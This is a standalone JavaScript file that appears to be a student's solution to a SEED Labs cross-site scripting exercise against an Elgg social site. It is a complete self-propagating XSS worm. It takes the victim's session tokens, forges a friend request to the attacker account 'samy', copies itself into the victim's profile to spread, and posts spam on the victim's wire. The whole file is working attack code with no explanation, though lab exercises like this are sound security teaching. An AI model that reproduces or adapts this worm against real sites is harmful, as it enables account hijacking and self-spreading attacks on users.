<script id = "worm" type="text/javascript">
window.onload = function(){

    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    

    // Sending friend request to samy
    var Ajax = null;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token="&__elgg_token=" + elgg.security.token.__elgg_token;
  
    let sammy_id = 59;
    let victim_id = elgg.session.user.guid;

    var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + sammy_id + "&__elgg_ts="+ts+"&__elgg_token="+token+"&__elgg_ts="+ts+"&__elgg_token="+token;

    if(victim_id != sammy_id){
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send();
    }



    // Modifying victim's profile
    Ajax = null;
    ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    token="&__elgg_token=" + elgg.security.token.__elgg_token;
    
   
  

    let victim_name = elgg.session.user.username;
    sendurl = "http://www.seed-server.com/action/profile/edit";
    var content = "__elgg_token="+token +
                    "&__elgg_ts="+ts+
                    "&name="+victim_name+
                    "&description="+wormCode+"&accesslevel[description]=2"+
                    "&briefdescription="+"1905101"+"&accesslevel[briefdescription]=2"+
                    "&location=randomlocation&accesslevel[location]=2"+
                    "&interests=Randomint&accesslevel[interests]=2"+
                    "&skills=Randomskill&accesslevel[skills]=2"+
                    "&contactemail=Randomabc@gmail.com&accesslevel[contactemail]=2"+
                    "&phone=Randomphone&accesslevel[phone]=2"+
                    "&mobile=RandomMobile&accesslevel[mobile]=2"+
                    "&website=http://www.random.com&accesslevel[website]=2"+
                    "&twitter=randomtwitter&accesslevel[twitter]=2"+
                    "&guid="+victim_id;

    if(victim_id != sammy_id){
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send(content);
    }



    //* Posting on wire
    

    
    let samy_profile_link = "http://www.seed-server.com/profile/samy"
    let victim_profile_link = "http://www.seed-server.com/profile/" + victim_name;


    sendurl = "http://www.seed-server.com/action/thewire/add";
    content = "__elgg_token="+token+
                    "&__elgg_ts="+ts+
                    "&body="+`To earn 12 USD/Hour(!), visit now ${victim_profile_link}`;

    if(victim_id != sammy_id){
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host","www.seed-server.com");
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send(content);
    }


}
</script>
